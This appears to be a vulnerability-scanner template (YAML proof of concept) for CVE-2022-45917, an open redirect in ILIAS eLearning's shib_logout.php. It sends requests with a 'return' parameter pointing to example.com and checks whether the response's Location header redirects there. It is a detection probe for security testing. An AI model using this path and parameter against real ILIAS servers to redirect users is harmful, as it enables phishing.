name: poc-yaml-ilias-elearning-platform-cve-2022-45917-url-redirection
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /shib_logout.php?action=logout&return=https://example.com
            follow_redirects: false
        expression: response.status == 302 && "(?m)^(?:Location\\s*?:\\s*?)(?:https?:\\/\\/|\\/\\/|\\/\\\\\\\\|\\/\\\\)?(?:[a-zA-Z0-9\\-_\\.@]*)example\\.com\\/?".bmatches(response.raw_header)
    r1:
        request:
            cache: true
            method: GET
            path: /ilias/shib_logout.php?action=logout&return=https://example.com
            follow_redirects: false
        expression: response.status == 302 && "(?m)^(?:Location\\s*?:\\s*?)(?:https?:\\/\\/|\\/\\/|\\/\\\\\\\\|\\/\\\\)?(?:[a-zA-Z0-9\\-_\\.@]*)example\\.com\\/?".bmatches(response.raw_header)
expression: r0() || r1()
detail:
    author: Â∞èz
    links:
        - https://packetstormsecurity.com/files/170181/ILIAS-eLearning-7.15-Command-Injection-XSS-LFI-Open-Redirect.html
    vulnerability:
        level: medium